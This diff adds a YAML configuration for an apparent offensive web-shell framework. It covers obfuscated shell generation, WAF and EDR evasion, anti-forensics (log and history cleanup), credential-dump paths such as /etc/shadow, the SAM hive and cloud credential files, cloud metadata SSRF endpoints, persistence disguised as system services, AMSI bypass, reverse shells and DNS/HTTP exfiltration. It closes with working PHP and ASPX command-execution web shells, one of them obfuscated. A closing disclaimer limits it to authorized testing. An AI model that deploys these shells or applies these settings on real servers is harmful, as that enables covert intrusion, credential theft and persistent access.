@@ -1,0 +1,503 @@
+# =============================================================================
+# Web Shell & Post-Web Exploitation Configuration
+# =============================================================================
+# Advanced web shell generation, obfuscation, and post-exploitation settings
+# Author: CyberApp Team
+# Version: 1.0.0
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# General Settings
+# -----------------------------------------------------------------------------
+general:
+  enabled: true
+  version: "1.0.0"
+  log_level: "INFO"
+  max_shells_cached: 100
+  auto_cleanup: true
+  cleanup_interval_hours: 24
+
+# -----------------------------------------------------------------------------
+# Shell Generation Settings
+# -----------------------------------------------------------------------------
+shell_generation:
+  # Default shell type (php, aspx, asp, jsp, jspx, cfm, pl, py, js)
+  default_type: "php"
+  
+  # Default obfuscation level (0-5)
+  # 0: None, 1: Low, 2: Medium, 3: High, 4: Paranoid, 5: AI-Enhanced
+  default_obfuscation: 3
+  
+  # Shell templates directory
+  templates_dir: "templates/shells"
+  
+  # Output directory for generated shells
+  output_dir: "output/shells"
+  
+  # Shell naming convention
+  naming:
+    use_random_names: true
+    random_name_length: 12
+    prefix: ""
+    suffix: ""
+    extensions:
+      php: [".php", ".phtml", ".php5", ".php7", ".phps", ".phar"]
+      aspx: [".aspx", ".ashx", ".asmx", ".ascx"]
+      asp: [".asp", ".asa", ".cdx", ".cer"]
+      jsp: [".jsp", ".jspx", ".jsf", ".jsv"]
+      js: [".js", ".mjs", ".node"]
+      py: [".py", ".pyc", ".pyw", ".wsgi"]
+
+# -----------------------------------------------------------------------------
+# Obfuscation Settings
+# -----------------------------------------------------------------------------
+obfuscation:
+  # AI-powered obfuscation
+  ai_enabled: true
+  ai_model: "local"  # local, openai, anthropic
+  
+  # Variable renaming
+  variable_rename:
+    enabled: true
+    use_realistic_names: true
+    protected_vars:
+      php: ["_GET", "_POST", "_REQUEST", "_COOKIE", "_SERVER", "_SESSION", "_FILES", "_ENV", "GLOBALS", "this"]
+      aspx: ["Request", "Response", "Session", "Server", "Application"]
+      
+  # String obfuscation
+  string_obfuscation:
+    enabled: true
+    methods:
+      - "chr_concat"      # chr(65).chr(66)...
+      - "base64_split"    # Split base64 into chunks
+      - "xor_encrypt"     # XOR with key
+      - "rot13"           # ROT13 encoding
+      - "hex_encode"      # \x41\x42...
+      
+  # Dead code injection
+  dead_code:
+    enabled: true
+    density: 0.3  # 30% chance per line
+    types:
+      - "false_conditionals"  # if(false){...}
+      - "empty_loops"         # for($i=0;$i<0;$i++){}
+      - "null_assignments"    # $x=null;
+      - "fake_api_calls"      # @file_get_contents('fake')
+      
+  # Control flow obfuscation
+  control_flow:
+    enabled: true
+    techniques:
+      - "opaque_predicates"   # (7*7==49)&&condition
+      - "state_machine"       # Switch-based flow
+      - "dispatcher"          # Function dispatcher
+      
+  # Polymorphic mutations
+  polymorphic:
+    enabled: true
+    mutation_rate: 0.8
+    unique_per_generation: true
+
+# -----------------------------------------------------------------------------
+# WAF/EDR Evasion Settings
+# -----------------------------------------------------------------------------
+evasion:
+  # Enabled evasion techniques
+  techniques:
+    chunked_transfer:
+      enabled: true
+      chunk_size: 20
+      
+    sleep_injection:
+      enabled: true
+      min_delay_us: 100
+      max_delay_us: 1000
+      probability: 0.3
+      
+    unicode_encoding:
+      enabled: true
+      encode_probability: 0.3
+      
+    base64_chunks:
+      enabled: true
+      chunk_size: 10
+      
+    gzip_compression:
+      enabled: true
+      compression_level: 9
+      
+    string_concat:
+      enabled: true
+      max_parts: 5
+      
+    char_code_build:
+      enabled: true
+      
+    encrypted_payload:
+      enabled: true
+      algorithm: "AES-256-CBC"
+      
+    steganography:
+      enabled: false
+      carrier_type: "image"  # image, audio
+      
+    time_based_activation:
+      enabled: false
+      delay_hours: 24
+      
+    environment_check:
+      enabled: true
+      checks:
+        - "debugger_detection"
+        - "sandbox_detection"
+        - "vm_detection"
+        - "bot_detection"
+
+  # WAF signature evasion
+  waf_bypass:
+    # Common WAF signatures to avoid
+    avoid_patterns:
+      - "eval("
+      - "exec("
+      - "system("
+      - "passthru("
+      - "shell_exec("
+      - "base64_decode("
+      - "$_GET"
+      - "$_POST"
+      - "<?php"
+      
+    # Alternative function mappings
+    function_alternatives:
+      eval: ["assert", "create_function", "preg_replace /e"]
+      exec: ["popen", "proc_open", "pcntl_exec"]
+      system: ["passthru", "shell_exec", "``"]
+      file_get_contents: ["file", "fopen+fread", "curl"]
+
+# -----------------------------------------------------------------------------
+# Authentication Settings
+# -----------------------------------------------------------------------------
+authentication:
+  enabled: true
+  default_method: "md5"  # md5, sha256, sha512, bcrypt, custom
+  
+  # Password requirements
+  password:
+    min_length: 8
+    require_special: true
+    require_numbers: true
+    
+  # Custom header authentication
+  custom_header:
+    enabled: false
+    header_name: "X-Auth-Token"
+    
+  # Time-based tokens
+  time_token:
+    enabled: false
+    validity_seconds: 300
+    
+  # IP whitelist
+  ip_whitelist:
+    enabled: false
+    allowed_ips: []
+    
+  # Fake 404 on auth failure
+  stealth_mode:
+    enabled: true
+    fake_response: "404"  # 404, 403, 500, custom
+
+# -----------------------------------------------------------------------------
+# Anti-Analysis Settings
+# -----------------------------------------------------------------------------
+anti_analysis:
+  # Anti-debugging
+  anti_debug:
+    enabled: true
+    techniques:
+      - "xdebug_check"
+      - "timing_check"
+      - "breakpoint_detection"
+      
+  # Anti-sandbox
+  anti_sandbox:
+    enabled: true
+    techniques:
+      - "hostname_check"
+      - "process_check"
+      - "timing_analysis"
+      - "user_agent_check"
+      
+  # Anti-VM
+  anti_vm:
+    enabled: false
+    techniques:
+      - "mac_address_check"
+      - "registry_check"
+      - "file_check"
+      
+  # Anti-forensics
+  anti_forensics:
+    enabled: true
+    techniques:
+      - "timestamp_manipulation"
+      - "log_cleanup"
+      - "history_clear"
+
+# -----------------------------------------------------------------------------
+# Communication Settings
+# -----------------------------------------------------------------------------
+communication:
+  # Encrypted communications
+  encryption:
+    enabled: true
+    algorithm: "AES-256-CBC"
+    key_derivation: "pbkdf2"
+    key_iterations: 10000
+    
+  # Request/Response format
+  format:
+    request_type: "json"  # json, form, xml
+    response_type: "json"
+    
+  # HTTP settings
+  http:
+    user_agent_rotation: true
+    custom_headers: {}
+    timeout_seconds: 30
+    
+  # Beacon callback
+  beacon:
+    enabled: false
+    callback_url: ""
+    interval_seconds: 30
+    jitter_percent: 20
+
+# -----------------------------------------------------------------------------
+# Post-Exploitation Settings
+# -----------------------------------------------------------------------------
+post_exploitation:
+  # Command execution
+  command_exec:
+    timeout_seconds: 30
+    max_output_size_kb: 1024
+    allowed_commands: []  # Empty = all allowed
+    blocked_commands: ["rm -rf /", "format c:"]
+    
+  # File operations
+  file_ops:
+    max_upload_size_mb: 50
+    max_download_size_mb: 100
+    allowed_paths: []  # Empty = all allowed
+    blocked_paths: ["/dev", "C:\\Windows\\System32"]
+    
+  # Port scanning
+  port_scan:
+    enabled: true
+    default_ports: [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
+    timeout_ms: 1000
+    max_concurrent: 50
+    
+  # SSRF probing
+  ssrf:
+    enabled: true
+    internal_ranges:
+      - "10.0.0.0/8"
+      - "172.16.0.0/12"
+      - "192.168.0.0/16"
+      - "127.0.0.0/8"
+    common_endpoints:
+      - "http://169.254.169.254/latest/meta-data/"  # AWS
+      - "http://metadata.google.internal/"           # GCP
+      - "http://169.254.169.254/metadata/instance"  # Azure
+      
+  # Credential dumping
+  credential_dump:
+    enabled: true
+    targets:
+      linux:
+        - "/etc/passwd"
+        - "/etc/shadow"
+        - "/etc/ssh/sshd_config"
+        - "/root/.ssh/id_rsa"
+        - "/root/.bash_history"
+        - "/var/www/.htpasswd"
+        - "~/.aws/credentials"
+        - "~/.docker/config.json"
+      windows:
+        - "C:\\Windows\\System32\\config\\SAM"
+        - "C:\\Windows\\System32\\config\\SYSTEM"
+        - "%APPDATA%\\Microsoft\\Credentials"
+      web_configs:
+        - "config.php"
+        - "wp-config.php"
+        - "configuration.php"
+        - "settings.php"
+        - ".env"
+        - "database.yml"
+        - "appsettings.json"
+
+# -----------------------------------------------------------------------------
+# Persistence Settings
+# -----------------------------------------------------------------------------
+persistence:
+  # Enabled persistence methods
+  methods:
+    cron:
+      enabled: true
+      schedule: "*/5 * * * *"
+      
+    startup:
+      enabled: true
+      registry_key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      
+    service:
+      enabled: true
+      service_name: "System Update Service"
+      
+    scheduled_task:
+      enabled: true
+      task_name: "SystemHealthCheck"
+      
+    webshell_backup:
+      enabled: true
+      backup_paths:
+        - "/tmp/.cache"
+        - "/var/tmp/.session"
+        - "C:\\Windows\\Temp"
+
+# -----------------------------------------------------------------------------
+# Reverse Shell Settings
+# -----------------------------------------------------------------------------
+reverse_shell:
+  # Memory-only shells
+  memory_only:
+    enabled: true
+    no_disk_artifacts: true
+    
+  # Shell types
+  types:
+    php:
+      enabled: true
+      
+    powershell:
+      enabled: true
+      bypass_amsi: true
+      bypass_clm: true
+      
+    python:
+      enabled: true
+      
+    bash:
+      enabled: true
+      
+    netcat:
+      enabled: true
+      
+    perl:
+      enabled: true
+
+  # Connection settings
+  connection:
+    retry_attempts: 3
+    retry_delay_seconds: 5
+    keepalive_interval: 30
+
+# -----------------------------------------------------------------------------
+# Exfiltration Settings
+# -----------------------------------------------------------------------------
+exfiltration:
+  # Enabled methods
+  methods:
+    http:
+      enabled: true
+      chunk_size_kb: 100
+      
+    dns:
+      enabled: true
+      max_label_length: 60
+      domain: ""
+      
+    icmp:
+      enabled: false
+      
+    steganography:
+      enabled: false
+      
+  # Encoding
+  encoding:
+    type: "base64"  # base64, hex, gzip+base64
+    
+  # Compression
+  compression:
+    enabled: true
+    algorithm: "gzip"
+    level: 9
+
+# -----------------------------------------------------------------------------
+# Logging & Audit
+# -----------------------------------------------------------------------------
+logging:
+  # Activity logging
+  activity_log:
+    enabled: true
+    log_file: "logs/webshell_activity.log"
+    log_level: "INFO"
+    
+  # Command logging
+  command_log:
+    enabled: true
+    log_file: "logs/webshell_commands.log"
+    
+  # Sanitization
+  sanitize_logs:
+    enabled: true
+    remove_passwords: true
+    remove_ips: false
+
+# -----------------------------------------------------------------------------
+# Integration Settings
+# -----------------------------------------------------------------------------
+integration:
+  # Beacon integration
+  beacon:
+    enabled: true
+    transition_seamless: true
+    
+  # C2 framework
+  c2:
+    enabled: true
+    framework: "internal"  # internal, cobalt_strike, metasploit
+    
+  # AI lateral movement guide
+  ai_lateral:
+    enabled: true
+    auto_suggest: true
+
+# -----------------------------------------------------------------------------
+# Shell Templates
+# -----------------------------------------------------------------------------
+templates:
+  # Minimal shells (small footprint)
+  minimal:
+    php: |
+      <?=`$_GET[0]`;
+    aspx: |
+      <%@Page Language="C#"%><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);%>
+      
+  # Stealth shells (obfuscated single line)
+  stealth:
+    php: |
+      <?php @eval(gzinflate(base64_decode(str_rot13($_REQUEST['d']))));?>
+    aspx: |
+      <%@Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>
+
+# -----------------------------------------------------------------------------
+# Security Warnings (Development Only)
+# -----------------------------------------------------------------------------
+warnings:
+  - "This module is for AUTHORIZED SECURITY TESTING ONLY"
+  - "Unauthorized use is ILLEGAL and may result in prosecution"
+  - "Always obtain written permission before testing"
+  - "Use responsibly and ethically"
+  - "The developers assume no liability for misuse"
